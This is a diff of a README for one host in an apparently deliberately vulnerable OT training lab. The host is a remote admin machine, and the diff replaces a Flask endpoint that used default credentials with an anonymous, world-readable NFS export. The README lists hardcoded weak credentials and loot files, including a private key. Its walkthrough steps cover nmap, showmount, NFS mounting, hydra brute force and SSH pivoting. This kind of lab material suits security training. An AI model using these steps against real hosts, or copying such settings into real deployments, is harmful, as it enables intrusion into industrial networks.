@@ -1,6 +1,6 @@
 # Remote admin machine
 
-Rincewind administers UU Power and Light remotely. His home machine has accumulated exactly the kind of artefacts that accumulate when convenience outranks hygiene: a weak SSH password, a Flask endpoint with default credentials, and a private key to the engineering workstation left in a directory named `.ssh-keys`. Three independent paths in, all active simultaneously. He is aware of the situation and is dealing with it.
+Rincewind administers UU Power and Light remotely. His home machine has accumulated exactly the kind of artefacts that accumulate when convenience outranks hygiene: a weak SSH password, a world-readable NFS share, and a private key to the engineering workstation left in a directory named `.ssh-keys`. Three independent paths in, all active simultaneously. He is aware of the situation and is dealing with it.
 
 ## Where this fits in real OT
 
@@ -8,16 +8,19 @@ A remote administrator's personal machine with VPN access into the corporate net
 
 ## Container details
 
-Base image: `debian:bookworm-slim`. Runs OpenSSH (port 22) and a Flask status application (port 80).
+Base image: `debian:bookworm-slim`. Runs OpenSSH (port 22) and NFS-Ganesha (user-space NFSv3 server, ports 111/2049/20048).
 
-User: `rincewind`, password `wizzard`. The Flask endpoint's credentials are `admin:admin`. Neither has been changed since the machine was provisioned.
+User: `rincewind`, password `wizzard`. Neither has been changed since the machine was provisioned.
 
-Python venv at `/opt/status-env` runs `status.py`. The WireGuard tools package is installed; no daemon runs.
+The WireGuard tools package is installed; no daemon runs. NFS-Ganesha exports a tmpfs staging directory as `/work` (pseudo path). The tmpfs workaround is needed because Docker's OverlayFS does not support `name_to_handle_at()`, which the VFS FSAL requires. The container runs `privileged: true` for this reason.
 
-Loot available once inside:
+Loot available once on the NFS share:
+- `/work/notes.txt`: VPN instructions, engineering workstation address, SCADA and historian URLs
+
+Additional loot available after SSH login:
 - `~/.vpn/uupl-vpn.conf`: WireGuard config listing enterprise and operational AllowedIPs (cosmetic, but useful for network mapping)
 - `~/.ssh-keys/uupl_eng_key`: Ed25519 private key for `engineer@10.10.2.30`
-- `~/notes.txt`: historian URL, SCADA URL, enterprise IPs
+- `~/notes.txt`: same notes file, also present in the home directory
 
 ## Connections
 
@@ -27,31 +30,27 @@ Loot available once inside:
 ## Protocols
 
 - SSH: port 22
-- HTTP: port 80 (`/status` endpoint, Basic auth)
+- rpcbind: port 111
+- NFS: port 2049
+- mountd: port 20048
 
 ## Built-in vulnerabilities
 
 Three attack paths, all active simultaneously:
 
 1. SSH brute force: `rincewind` / `wizzard`
-2. OSINT pivot: `prior-recon.txt` in each adversary home on `unseen-gate` references 10.10.0.10
-3. HTTP status endpoint: `GET /status` with `Authorization: Basic YWRtaW46YWRtaW4=` (`admin:admin`)
+2. NFS anonymous mount: `/work` exported world-readable with no authentication (`all_squash`, no client restriction)
+3. OSINT pivot: `prior-recon.txt` in each adversary home on `unseen-gate` references 10.10.0.10 with open ports noted
 
-The SSH key for the engineering workstation is the primary loot. Everything else is reconnaissance.
+The SSH key for the engineering workstation is the primary loot. The NFS share contains the notes file that points toward it.
 
 ## Modifying vulnerabilities
 
 To change the SSH password: edit the `chpasswd` line in the Dockerfile.
 
-To change Flask credentials: edit `ADMIN_USER` and `ADMIN_PASS` in `app/status.py`.
+To restrict NFS access: add a `CLIENT { Clients = 10.10.0.5; ... }` block to `ganesha.conf` and rebuild.
 
-To remove the HTTP path entirely: remove the Flask install, the COPY of `status.py`, and the `exec` invocation in `entrypoint.sh`. Rebuild.
-
-To add loot: place files in `loot/` and add COPY directives to the Dockerfile.
-
-## Hardening suggestions
-
-Use a strong, unique SSH password or disable password auth entirely. Rotate the Flask credentials. In a real deployment, private keys for production systems would not be kept on a personal machine in plaintext; the engineering workstation key is the main finding a post-incident review would note.
+To add loot: place files in `loot/` and add COPY directives to the Dockerfile. The entrypoint copies `loot/` contents to the tmpfs at startup, so files added to `/home/rincewind/work` via the Dockerfile end up in the NFS export automatically.
 
 ## Observability and debugging
 
@@ -59,7 +58,8 @@ Use a strong, unique SSH password or disable password auth entirely. Rotate the 
 docker logs admin-home
 docker exec -it admin-home bash
 ssh rincewind@10.10.0.10          # from unseen-gate; password: wizzard
-curl -u admin:admin http://10.10.0.10/status
+showmount -e 10.10.0.10           # from attacker machine or host
+mount -t nfs -o vers=3 10.10.0.10:/work /mnt   # from attacker machine
 ```
 
 ## Concrete attack paths
@@ -70,9 +70,11 @@ Path A (OSINT and SSH):
 3. Collect `~/.ssh-keys/uupl_eng_key` and `~/notes.txt`
 4. `ssh -i uupl_eng_key engineer@10.10.2.30`
 
-Path B (HTTP):
-1. `curl -u admin:admin http://10.10.0.10/status` confirms VPN and network membership
-2. Correlate with recon notes to orient within the topology
+Path B (NFS anonymous mount):
+1. `nmap -sV 10.10.0.10` reveals 111/rpcbind and 2049/nfs
+2. `showmount -e 10.10.0.10` reveals `/work *`
+3. `mkdir /tmp/loot && mount -t nfs -o vers=3 10.10.0.10:/work /tmp/loot`
+4. `cat /tmp/loot/notes.txt` confirms VPN instructions and engineering workstation address
 
 Path C (brute force):
 1. `hydra -l rincewind -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.10`
@@ -84,6 +86,8 @@ The "VPN tunnel" is simulated by dual-homing. No WireGuard daemon runs. The `.vp
 
 The enterprise NIC (10.10.1.3) is accessible from a shell on this machine immediately. No separate route or tunnel needed.
 
+NFS-Ganesha logs to stdout. `docker logs admin-home` shows the full startup sequence. The DBUS and Kerberos warnings at startup are expected in a containerised environment and do not affect NFS operation.
+
 ## In short
 
-Remote admin machine, dual-homed into enterprise. Three simultaneous compromise paths. Primary loot: Ed25519 key for the engineering workstation. The machine is the VPN.
+Remote admin machine, dual-homed into enterprise. Three simultaneous compromise paths. The NFS share hands out the notes file without any credentials; SSH hands out the engineering workstation key. The machine is the VPN.
